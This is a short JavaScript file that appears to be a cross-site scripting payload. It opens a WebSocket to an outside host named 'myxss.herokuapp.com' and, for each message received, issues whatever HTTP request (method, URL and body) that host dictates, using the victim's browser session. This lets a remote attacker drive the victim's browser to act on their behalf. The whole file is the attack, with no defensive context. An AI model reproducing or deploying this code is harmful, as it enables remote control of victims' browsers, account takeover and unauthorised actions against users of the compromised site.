'use strict';

function makeRequest(json, method, url) {
  return new Promise((resolve, reject) => {
    const xhr = new XMLHttpRequest();
    xhr.onload = function() {
      if (this.status >= 200 && this.status < 300) {
        resolve(xhr.response);
      } else {
        reject({
          status: this.status,
          statusText: xhr.statusText
        });
      }
    };
    xhr.onerror = function() {
      reject({
        status: this.status,
        statusText: xhr.statusText
      });
    };
    xhr.open(method, url);
    xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
    xhr.send(json);
  });
}

const ws = new WebSocket("ws://myxss.herokuapp.com/");
ws.send('Connected');
ws.onmessage = async (event) => {
    const json = JSON.parse(event.data);
	try{
		const responce = await makeRequest(json.data, json.method, json.url);
		console.dir(responce);
	} catch(err) {
		console.error(err);
	}
};
